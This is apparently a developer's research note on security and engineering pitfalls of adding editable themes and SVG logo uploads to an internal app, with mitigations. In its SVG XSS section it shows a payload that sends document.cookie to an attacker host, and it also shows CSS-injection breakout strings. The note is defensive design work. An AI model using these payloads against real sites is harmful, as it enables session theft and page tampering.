# Pitfalls Research

**Domain:** Runtime-editable theming + logo upload — KPI Light v1.1 Branding & Settings
**Project:** KPI Light
**Researched:** 2026-04-11
**Confidence:** HIGH (SVG/CSS security: OWASP + live CVE/PR evidence; PostgreSQL bytea/concurrency: official docs + Cybertec; i18next persistence: GitHub issue tracker; FOUC: Vite issue tracker + MDN; logo cache: MDN HTTP caching)

---

## Critical Pitfalls

Mistakes that cause security vulnerabilities, data corruption, or rewrites if addressed late.

---

### Pitfall 1: SVG XSS — Uploaded SVG Executes JavaScript

**What goes wrong:**
A user uploads an SVG file that contains `<script>alert(1)</script>` or an element with an event handler like `<rect onload="fetch('https://attacker.com?c='+document.cookie)" />`. The server saves it as-is. The frontend renders it inline or as an `<img>` with wrong MIME-type handling, and the script executes in the app's origin, accessing session cookies, API tokens, or any data the JS context can reach.

Real-world precedent: Ghost CMS patched exactly this in PR #19646 (2025). A stored XSS via SVG upload allowed arbitrary script execution in the admin context.

**Why it happens:**
Developers think "it's just a logo, trusted users only" and skip sanitization. But SVG is XML with a full event model. Unlike PNG/JPEG, SVG can contain `<script>` tags, `javascript:` URIs in `href`, `xlink:href` attributes, and `on*` event handlers on any element. The "trusted users" argument fails because: (a) credentials are sometimes shared in internal tools, (b) internal tools get phished, and (c) v1.1 has zero auth — anyone who can reach the UI can upload.

**How to avoid:**
Server-side sanitization is mandatory. The recommended Python-side approach is to parse the SVG as XML with `defusedxml` (prevents XXE/entity expansion attacks) and then apply an allowlist-based element and attribute filter before saving. The Python library `nh3` (a fast Rust-backed HTML/SVG sanitizer) is the recommended choice over `bleach` — bleach's own docs warn it is not intended for SVG contexts.

For the frontend, never inline the raw SVG bytes fetched from the API. Serve it via `<img src="/api/settings/logo">` with `Content-Type: image/svg+xml` and `Content-Disposition: inline` — this keeps it in its own rendering context and prevents script execution in the main origin. Do not use `dangerouslySetInnerHTML` with raw SVG content from the server.

Additionally: serve the logo endpoint with `X-Content-Type-Options: nosniff` to prevent MIME-type sniffing. Consider converting accepted SVG to a rasterized PNG server-side (using `cairosvg`) as the nuclear option — zero XSS risk but loses vector quality. For a 60×60 display this is acceptable.

**Warning signs:**
- Logo served inline via `dangerouslySetInnerHTML`
- SVG saved to storage without any XML parsing step
- No Content-Type header on the logo endpoint
- Server accepts SVG files > 100 KB without suspicion (embedded scripts are small)

**Phase to address:**
Settings backend (logo upload endpoint). Must be implemented before any logo is persistable. Cannot be retrofitted safely after the feature ships — patching after requires migrating existing stored content.

---

### Pitfall 2: CSS Variable Injection — Raw Color String Written to CSS

**What goes wrong:**
The settings API returns a color value like `oklch(0.5 0.2 200)` and the frontend sets it with `document.documentElement.style.setProperty('--primary', value)` where `value` comes directly from the API response. An attacker (or a curious user — remember: no auth) submits a color string like `red; --muted: red; --background: url(javascript:alert(1))` or `oklch(0 0 0); } body { display:none; } :root {`. This breaks out of the CSS value and injects arbitrary rules.

**Why it happens:**
CSS `setProperty` does NOT escape the value. The browser will parse whatever string is passed as a CSS value, including `;`, `}`, `url()`, and `expression()` (IE legacy but illustrative). If the value contains `;` followed by more property declarations, those declarations execute. This is classified as CSS Injection by OWASP.

**Project-specific complication:**
The existing `index.css` uses `oklch()` color format, not hex. This is correct for the Tailwind v4 / shadcn stack, but it means a hex-only validator would reject valid theme colors. The validation strategy must match the format actually stored:

- **Accept only:** `oklch(L C H)` where L is 0–1, C is 0–0.4, H is 0–360 — validate with a strict regex server-side and client-side.
- **Reject:** Any string containing `;`, `}`, `{`, `url(`, `expression(`, `var(`, `calc(` with nested parens, quotes, or `//`.
- **Do not accept:** Raw hex from the color picker if colors are stored as oklch — convert at input time using a library (e.g., `culori` on the frontend) and validate the result before submitting to the API.

The Pydantic model on the backend should use a `@field_validator` that applies a strict regex. Never pass the raw string to SQL as-is; store it as TEXT in Postgres and re-validate on read before injecting into any CSS context.

**How to avoid:**
1. Pydantic field validator with strict regex for the specific color format used (oklch values only, with numeric range checks)
2. Frontend: validate before `setProperty` call using the same regex
3. Never allow free-text color input — use a color picker UI that produces values in the expected format, then validate the output
4. CSP header on the app prevents `url(javascript:...)` from executing even if injected

**Warning signs:**
- Color stored as raw user-supplied string with no format check
- `setProperty` called with `settings.primaryColor` without sanitization
- Color picker that allows the user to type arbitrary CSS strings

**Phase to address:**
Settings backend (Pydantic schema for settings model) and Settings UI (color picker + live preview). Both must enforce the same validation. Design the Pydantic model first.

---

### Pitfall 3: FOUC — Default Brand Colors Flash Before Settings Load

**What goes wrong:**
The app boots with the hardcoded `index.css` defaults (current shadcn oklch palette, app title "KPI Light"). The settings are fetched from the API after React mounts. For 200–800ms the user sees the old brand — wrong primary color, old logo, "KPI Light" in the nav. This looks broken, especially if the brand colors are significantly different.

**Why it happens:**
Vite SPAs load CSS synchronously from the HTML `<link>` tag, so the static `index.css` colors are applied immediately. Dynamic settings arrive via an API call in a `useEffect` or `useQuery`, which runs after hydration. The gap between static CSS paint and dynamic CSS override is the FOUC window.

**Project-specific context:**
The current `main.tsx` has no blocking script before `ReactDOM.createRoot`. `index.html` has no inline script. The i18n module hardcodes `lng: "de"` — there is no language detector reading from localStorage yet. Once a language setting is added to the settings API, the same FOUC problem applies to language.

**How to avoid:**
Two complementary strategies:

1. **Skeleton approach (recommended for this project):** Show a neutral loading state (no colors applied, spinner only) until settings are confirmed loaded. Use a React context/provider that wraps the whole app; render children only after the settings query resolves. This keeps the static CSS as a fallback rather than a flash.

2. **Inline script approach (alternative):** Embed a tiny `<script>` in `index.html` `<head>` that reads the last-known settings from `localStorage` and applies CSS vars to `:root` synchronously before React mounts. This is the pattern used by dark-mode-on-first-paint solutions. Risk: stale cached theme if settings changed from another session.

For the settings provider pattern: use TanStack Query with a dedicated `settingsKeys` query family. Treat the settings load as a blocking condition for rendering the main layout — show a full-page skeleton instead of the app until `isSuccess`. This is consistent with the existing TanStack Query pattern in the codebase.

**Warning signs:**
- Settings applied in a `useEffect` inside a component that renders content
- No loading state for the settings query
- User visually reports "the colors flash on load"

**Phase to address:**
Settings UI (frontend provider/context layer). Must be designed before implementing the live preview feature — the provider architecture underpins both.

---

## Moderate Pitfalls

Mistakes that cause bugs, UX degradation, or meaningful tech debt but not rewrites.

---

### Pitfall 4: Logo Cache Staleness — Browser Serves Old Logo After Upload

**What goes wrong:**
User uploads a new logo. The API returns 200. The page refreshes. The old logo still appears because `<img src="/api/settings/logo">` was cached by the browser with `Cache-Control: max-age=3600`. The user thinks the upload failed and uploads again.

**Why it happens:**
Image URLs are cached by the browser based on the URL as the cache key. If the URL doesn't change between uploads, the browser serves the cached response and never revalidates. ETag-based revalidation only helps if the browser decides to revalidate (after max-age expires or on hard refresh).

**How to avoid:**
Two complementary approaches:

1. **Version query parameter (recommended):** Store an `updated_at` timestamp with each logo save. The frontend constructs the URL as `/api/settings/logo?v={updated_at_epoch}`. When settings are fetched and a new logo timestamp is returned, the URL changes and the browser fetches fresh. This is deterministic and requires zero backend header configuration.

2. **Cache-Control header:** Set `Cache-Control: no-cache` (not `no-store`) on the logo endpoint. This forces revalidation on every request, but the server can respond with `304 Not Modified` if the ETag matches — cheap for unchanged logos, correct for changed ones.

Avoid `Cache-Control: max-age=N` on mutable binary endpoints — it causes exactly this problem. The logo is mutable; do not cache it as if it were a versioned static asset.

**Warning signs:**
- Logo endpoint served with `Cache-Control: max-age=...` or no Cache-Control header (defaults to heuristic caching)
- Logo URL is static (`/api/settings/logo` with no version component)
- No `ETag` header on the logo response

**Phase to address:**
Settings backend (logo endpoint response headers) and Settings UI (URL construction when rendering logo). Handle together — fixing only the backend is insufficient if the frontend hardcodes the URL.

---

### Pitfall 5: Single-Row Settings Table — Concurrency and Migration Friction

**What goes wrong (concurrency):**
Two users open the Settings page simultaneously. Both load the current settings. User A changes the primary color and saves. User B changes the logo and saves. User B's save overwrites User A's color change with the stale value from when they loaded the page — last write wins, User A's change is silently lost. With no auth in v1.1, this is not a theoretical concern.

**What goes wrong (migration friction):**
The settings table starts with 6 color columns + logo column + app_name + language. In v1.2, a new setting is added (e.g., `show_sidebar`). Alembic migration adds the column with a default. But if the application code reads the settings and tries to patch back only the columns it knows about (not `show_sidebar`), the migration-added column gets reset to NULL on the next save because the Pydantic schema didn't include it. Each new column requires updating the Pydantic schema, the API patch handler, and the frontend form — easy to miss one.

**How to avoid (concurrency):**
Use optimistic locking via `updated_at`. The settings table has a `updated_at TIMESTAMPTZ` column updated by a database trigger or application code on every write. The API's PATCH/PUT endpoint accepts the `updated_at` the client read, includes it in the WHERE clause:

```sql
UPDATE app_settings
SET primary_color = $1, ..., updated_at = NOW()
WHERE id = 1 AND updated_at = $last_known_updated_at
```

If 0 rows are updated, return HTTP 409 Conflict. The frontend shows "Settings were updated by another session — please reload and try again." For an internal small-team tool this is acceptable UX.

**How to avoid (migration friction):**
Use a JSONB column for extensible settings alongside fixed columns for known constraints (logo as bytea or path, updated_at for concurrency). JSONB allows adding new settings keys without schema migrations:

```python
class AppSettings(Base):
    id: int  # always 1
    logo: bytes | None  # bytea, fixed
    updated_at: datetime  # optimistic lock
    settings: dict  # JSONB — colors, app_name, language, future flags
```

Alternatively: keep all color/string settings as JSONB and only use typed columns for binary data and the timestamp. This eliminates per-column migrations for new settings.

**Warning signs:**
- Settings table has 10+ individual columns for string values
- No `updated_at` column or no use of it in WHERE clause during updates
- PATCH handler does `SELECT * → merge → INSERT OR UPDATE` without concurrency check

**Phase to address:**
Settings backend (Alembic migration design). The schema decision (columnar vs JSONB) must be made before writing the migration — changing from columnar to JSONB after data is stored requires a data migration.

---

### Pitfall 6: bytea vs Filesystem — Wrong Choice Creates Operational Pain

**What goes wrong:**
**If bytea (DB storage):** A 1 MB logo stored in bytea is fetched via a SQLAlchemy query on every page that shows the logo. The entire binary is loaded into Python memory, serialized to JSON-unfriendly bytes, base64-encoded for the API response, and decoded by the browser. The settings row becomes a "fat row" — PostgreSQL TOAST handles storage transparently, but the row still participates in table scans and backup dumps. The `pg_dump` backup for a small app now includes MB of binary data. Query performance degrades measurably for binary retrieval vs. filesystem read.

**If filesystem (container path):** The logo is written to `/app/logos/logo.png` inside the API container. After `docker compose up --build` (image rebuild), the container's writable layer is fresh — the logo is gone. The named volume is not mounted to `/app/logos/`, so data lives in the ephemeral container layer.

**How to avoid:**

For this project (1 MB max, single logo, Docker Compose deployment):

**Recommended: bytea in PostgreSQL.** The 1 MB limit makes bytea practical. TOAST handles out-of-line storage automatically for values > 8 KB. The benefit is zero Docker volume configuration complexity — the logo is part of the database, already backed up with `pg_dump`, and consistent with the ACID semantics of the settings row. The 10x performance disadvantage cited in benchmarks applies to high-throughput scenarios; for a logo loaded once per session by an internal team, it is irrelevant.

If filesystem is chosen (to avoid bytea), a named Docker volume MUST be mounted to the logo directory in `docker-compose.yml`. The volume must be declared in the top-level `volumes:` section. Failure to do this means the logo survives `docker compose restart` (container reuse) but is lost on `docker compose up --build` (image rebuild with new container). This is a silent data-loss failure mode that is hard to reproduce in development (where you rarely rebuild images) but common in production (where you rebuild on deploy).

**Warning signs (filesystem path chosen without volume):**
- Logo path is hardcoded inside the container (`/app/static/` or `/tmp/`) with no corresponding volume mount in `docker-compose.yml`
- Logo survives `docker compose restart` but disappears after `docker compose up --build`

**Warning signs (bytea chosen):**
- Logo not enforcing the 1 MB limit server-side before writing to DB (a 10 MB logo in bytea is a real problem)

**Phase to address:**
Settings backend (Alembic migration for logo storage + Docker Compose configuration if filesystem is chosen). Decide storage strategy before writing the migration — changing from bytea to file path after data is stored requires extracting binary data and migrating paths.

---

### Pitfall 7: Language Default vs. API Override — i18next Detection Loop

**What goes wrong:**
The current `i18n.ts` hardcodes `lng: "de"` with no language detector. For v1.1, the settings API provides a `default_language` field. The naive implementation adds `i18next-browser-languageDetector`, sets detection order to `[localStorage, navigator]`, and then tries to override with the API value by calling `i18n.changeLanguage(settings.language)` in a `useEffect`. This creates a race: on first render, i18next detects the browser language (e.g., `en-US`), renders English UI. The settings query resolves, calls `changeLanguage('de')`, UI flickers to German. On next reload, `localStorage` now stores `de` from the previous session's API override, which may conflict with a new user opening the same browser.

**Project-specific context:**
The current `i18n.ts` does NOT use the browser language detector — `lng: "de"` is hardcoded. The i18n setup is maximally simple. Adding a language detector for a database-driven default introduces all the detection-order complexity without adding value for an app where the language is organization-wide, not per-user.

**How to avoid:**
Do not use `i18next-browser-languageDetector` for this feature. The organization-wide language setting is a server-driven value, not a browser preference. The correct pattern:

1. Fetch settings from API before i18n initializes (or use a deferred initialization pattern)
2. Pass `lng: settings.default_language` to `i18n.init()` — this overrides detection entirely
3. Or: initialize i18n with a placeholder, then call `i18n.changeLanguage(settings.default_language)` exactly once when the settings query resolves, before rendering any translated content (the FOUC guard from Pitfall 3 handles this)

The key rule: `i18n.changeLanguage()` called after render causes a re-render flash. It must be called before the main layout renders, which the settings loading skeleton from Pitfall 3 already achieves.

Do not write the API-supplied language to `localStorage` — this creates state split between the server (source of truth) and the browser (stale cache). If the org changes the default language, localStorage cache fights the new setting.

**Warning signs:**
- `i18next-browser-languageDetector` installed in `package.json`
- `i18n.changeLanguage()` called inside a `useEffect` that runs after component mount
- Language stored in `localStorage` independently of the settings API value

**Phase to address:**
Settings UI (i18n integration). Must be decided in the settings provider architecture, before the Settings page UI is built.

---

### Pitfall 8: Accessibility Regression — User Picks Low-Contrast Color Palette

**What goes wrong:**
User sets `--primary` to `oklch(0.9 0.1 200)` (very light blue) and `--foreground` to `oklch(0.85 0 0)` (light gray). Text becomes unreadable. The app still looks like it's working but fails WCAG 2.1 AA's 4.5:1 contrast ratio for normal text. If the app is ever used by someone with low vision, it becomes functionally inaccessible.

**Why it matters:**
The European Accessibility Act came into force in June 2025. While KPI Light is an internal tool and may not be subject to EAA compliance in v1, building in a contrast guard now is a one-time cheap fix versus a future rework. The risk is also reputational: a team member with low vision may not be able to use the app after a well-meaning colleague "improves" the theme.

**How to avoid:**
Warn, do not enforce (for v1.1). Enforcing would require computing contrast ratios for all foreground/background pairs after any edit — complex. Warning on the most critical pair is feasible:

1. When the user picks a primary color, compute the contrast ratio between `primary` and `primary-foreground` using the WCAG formula on the frontend (the `chroma.js` or `culori` libraries provide this).
2. If ratio < 4.5:1, show an inline warning: "Low contrast — text on this color may be hard to read (ratio: X:1, minimum 4.5:1)."
3. Allow the user to save anyway — do not block — since this is an internal tool and the user may be intentionally choosing a palette they've verified externally.

Do not attempt to enforce all 10+ color pairs in v1.1. Start with: `primary/primary-foreground`, `background/foreground`, `destructive/white`.

**Warning signs:**
- No contrast feedback in the color picker UI
- Theme saved and applied without any accessibility check

**Phase to address:**
Settings UI (color picker component). Implement the contrast check alongside the color picker — retrofitting it later means re-opening a completed component.

---

### Pitfall 9: Reset-to-Default — Code Defaults and Stored Customization Diverge

**What goes wrong:**
User customizes the theme. Six months later, a code update changes the hardcoded defaults in `index.css` (e.g., primary color oklch values updated). User clicks "Reset to defaults" in the Settings UI. The backend deletes the settings row (or sets it to NULL) and the frontend falls back to the static CSS defaults — but those defaults have changed in a code deploy the user didn't notice. The "reset" produces a different result than the user expected. Worse: if the reset logic fetches defaults from the backend and the backend returns hardcoded values from a config file, a mismatch between the config file and `index.css` produces a broken theme.

**How to avoid:**
Define a canonical `DEFAULT_SETTINGS` object in the backend (e.g., `app/defaults.py`) that is the single source of truth for reset values. The frontend `index.css` should reference these same values (documented, not programmatically linked — that's over-engineering for v1.1). The reset endpoint returns this canonical object and overwrites the DB row with it rather than deleting it.

Document in the codebase: "If you change a CSS variable default in `index.css`, also update `DEFAULT_SETTINGS` in `defaults.py`." This is manual discipline, not a technical lock — for a two-file change that happens rarely, this is acceptable.

Do not implement "reset to defaults" as `DELETE FROM app_settings` — an empty table means the app has no settings at all, which can crash settings-dependent initialization if there is no fallback guard. Always use `UPSERT` for settings operations.

**Warning signs:**
- "Reset" is implemented as a DELETE query
- Default values are hardcoded in multiple places (frontend constants, backend config, and CSS file) that can drift independently
- No single `DEFAULT_SETTINGS` canonical definition

**Phase to address:**
Settings backend (API design and defaults module). Establish the defaults module before implementing the reset endpoint — the reset logic depends on it.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skip SVG sanitization for "internal users" | Faster to build | Stored XSS vulnerability; security retrofit requires invalidating all stored logos | Never — zero-auth app with SVG upload is an explicit OWASP risk |
| Store color as raw user string (no format validation) | No validation code to write | CSS injection vector; hard to enforce color format consistency later | Never — validate format at the Pydantic model layer |
| Logo on container filesystem without named volume | Simpler code path | Logo lost on every image rebuild (every deploy); invisible in development | Never in production; acceptable in local dev if volume is added before first deploy |
| `i18n.changeLanguage()` in useEffect after mount | Quick to implement | Language flash on every load; localStorage/API state split | Never — deferred i18n init costs the same effort up front |
| Columnar settings table with 10+ color columns | Familiar pattern | Every new setting = Alembic migration + Pydantic update + frontend form change | Acceptable only if the full settings surface is known and frozen |
| No contrast check in color picker | Saves ~2 hours | Accessibility regression; no warning before users break the UI | Acceptable only if documented as known limitation and deferred to v1.2 with a filed issue |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Serving SVG with `Content-Type: text/html` or no header | Script execution in app origin | Set explicit `Content-Type: image/svg+xml` + `X-Content-Type-Options: nosniff` on logo endpoint |
| Inline SVG via `dangerouslySetInnerHTML` | XSS in main React tree | Use `<img>` tag only; never inline raw SVG from server |
| Raw user color string passed to `style.setProperty` | CSS injection | Validate format with strict regex before applying |
| Accepting HSL, RGB, named colors, or `var()` as color input | CSS injection surface expands | Restrict to the single format used internally (oklch numeric values) |
| Logo stored in DB without size enforcement | 10 MB logo in bytea bloats DB row; slow backup | Enforce 1 MB limit in FastAPI before DB write (`UploadFile` size check) |
| No `Content-Disposition` on logo endpoint | Browser may execute SVG if opened directly | Set `Content-Disposition: inline` — display in browser, not download |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Live preview applies permanently before Save | User experiment breaks the app for all users between preview and cancel | Apply preview only to local CSS vars; never persist until Save is clicked |
| Reset wipes all settings including logo | User loses logo they can't easily re-upload | Offer granular reset: "Reset colors" vs "Reset all" — confirm before executing |
| No visual feedback that settings saved | User clicks Save, nothing happens visually, clicks again | Show a transient success toast (existing toast infrastructure from v1.0) |
| Logo upload with no size/format error message | User uploads a 5 MB JPEG, gets a generic 422 | Return a specific error: "Logo must be PNG or SVG, max 1 MB. Received: 4.8 MB JPEG." |
| Language change without reload warning | UI language flips mid-session; some components may not re-render | Apply language change immediately (i18next handles this) but show inline note if any stale label exists |
| Color picker returns hex but storage expects oklch | Colors appear to save but are silently rejected or stored in wrong format | Convert hex→oklch in the frontend before submission using `culori`; display converted value |

---

## "Looks Done But Isn't" Checklist

- [ ] **SVG upload:** Is the SVG parsed server-side with `defusedxml` and run through an element/attribute allowlist before storage? Verify with a malicious SVG test file containing `<script>alert(1)</script>`.
- [ ] **Color validation:** Does the Pydantic model reject `oklch(0 0 0); --background: red`? Test with a payload containing a semicolon.
- [ ] **Logo cache:** After uploading a new logo, does a hard refresh still show the new logo? (Hard refresh bypasses browser cache — verify ETag or query-param strategy is working by testing with DevTools Network tab, no throttle, Disable cache unchecked.)
- [ ] **FOUC guard:** Does the app show a neutral skeleton (not default brand) during the settings API call? Test by throttling the API to 2G in DevTools.
- [ ] **Concurrency:** If two browser tabs save different settings simultaneously, does the second save return 409 or silently overwrite? Test with two tabs open to the Settings page.
- [ ] **Docker volume:** After `docker compose up --build` (not just restart), does the logo persist? Test by uploading a logo, rebuilding the image, and confirming it survives.
- [ ] **Reset endpoint:** Does `POST /api/settings/reset` use UPSERT (not DELETE)? Verify the settings table always has exactly one row after reset.
- [ ] **Language setting:** Is `i18n.changeLanguage()` called before the main layout renders (not inside a useEffect that fires post-render)? Test by hard-refreshing with a non-default language saved — no flash of the wrong language should appear.
- [ ] **Contrast warning:** Does picking `oklch(0.95 0 0)` as primary color trigger a visible contrast warning in the UI?

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| SVG XSS discovered after ship | HIGH | Invalidate all stored logos; re-sanitize or require re-upload; patch endpoint; audit server logs for exploit attempts |
| CSS injection stored in DB | MEDIUM | Clear settings row; reset to defaults; patch Pydantic validator; no data breach if no auth context was exploitable |
| Logo lost after container rebuild | LOW | Re-upload logo (small user action); add named volume to compose file; no data corruption |
| FOUC not fixed before user testing | LOW | Add skeleton layer before next deploy; users notice but data is not affected |
| Stale logo cache reported by user | LOW | Advise hard refresh as immediate fix; deploy query-param version strategy |
| Settings concurrency overwrote a change | LOW | User redoes the overwritten setting; add optimistic locking to prevent recurrence |
| Reset-to-default produced unexpected theme | LOW | User manually re-applies their preferred theme; canonicalize defaults module |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| SVG XSS (Pitfall 1) | Settings backend — logo upload endpoint | Upload a malicious SVG; confirm script does not execute; check stored bytes are sanitized |
| CSS variable injection (Pitfall 2) | Settings backend — Pydantic color schema + Settings UI color picker | POST color value with semicolon; confirm 422 response |
| FOUC on settings load (Pitfall 3) | Settings UI — provider/context architecture | Throttle API to 2G; confirm neutral skeleton shown; no default brand flash |
| Logo cache staleness (Pitfall 4) | Settings backend (response headers) + Settings UI (URL with version param) | Upload logo; check Network tab; confirm 200 response (not 304 from cache) |
| Single-row concurrency + migration friction (Pitfall 5) | Settings backend — Alembic migration design | Two simultaneous saves; confirm 409 on second; check JSONB or updated_at strategy |
| bytea vs filesystem + Docker volume (Pitfall 6) | Settings backend + Docker Compose config | `docker compose up --build` after uploading logo; confirm logo persists |
| i18next language detection loop (Pitfall 7) | Settings UI — i18n integration in provider | Hard refresh with non-default language saved; confirm no flash of wrong language |
| Accessibility contrast regression (Pitfall 8) | Settings UI — color picker component | Pick a failing color combination; confirm contrast warning appears |
| Reset-to-default divergence (Pitfall 9) | Settings backend — defaults module | POST /api/settings/reset; confirm row exists (not deleted); confirm returned values match index.css |

---

## Sources

- Ghost CMS SVG XSS PR #19646 (2025): https://github.com/TryGhost/Ghost/pull/19646
- SVG XSS attack vectors (SVG Genie Blog, 2025): https://www.svggenie.com/blog/svg-security-best-practices
- DOMPurify (cure53 / npm): https://github.com/cure53/DOMPurify
- OWASP CSS Injection Testing Guide: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection
- CSS Injection: Beyond XSS (technical deep-dive): https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/
- MDN: HTTP Caching (ETag / Cache-Control): https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching
- Cache busting strategies (Trys Mudford): https://www.trysmudford.com/blog/cache-busting/
- PostgreSQL binary data performance (CYBERTEC): https://www.cybertec-postgresql.com/en/binary-data-performance-in-postgresql/
- PostgreSQL BinaryFilesInDB wiki: https://wiki.postgresql.org/wiki/BinaryFilesInDB
- PostgreSQL anti-patterns: read-modify-write cycles (EDB): https://www.enterprisedb.com/blog/postgresql-anti-patterns-read-modify-write-cycles
- i18next-browser-languageDetector localStorage overwrite issue #250: https://github.com/i18next/i18next-browser-languageDetector/issues/250
- WCAG color contrast 2025 (AllAccessible): https://www.allaccessible.org/blog/color-contrast-accessibility-wcag-guide-2025
- FOUC in Vite SPA (Vite issue #7973): https://github.com/vitejs/vite/issues/7973
- Vite FOUC fix — dark mode flickering pattern: https://notanumber.in/blog/fixing-react-dark-mode-flickering
- Docker volumes data persistence guide: https://www.owais.io/blog/2025-09-12_docker-volumes-data-persistence-part1/
- bleach docs — SVG not a supported context: https://bleach.readthedocs.io/en/latest/clean.html
- CairoSVG (SVG → PNG rasterization option): https://cairosvg.org/documentation/

---
*Pitfalls research for: Runtime-editable theming + logo upload (KPI Light v1.1)*
*Researched: 2026-04-11*
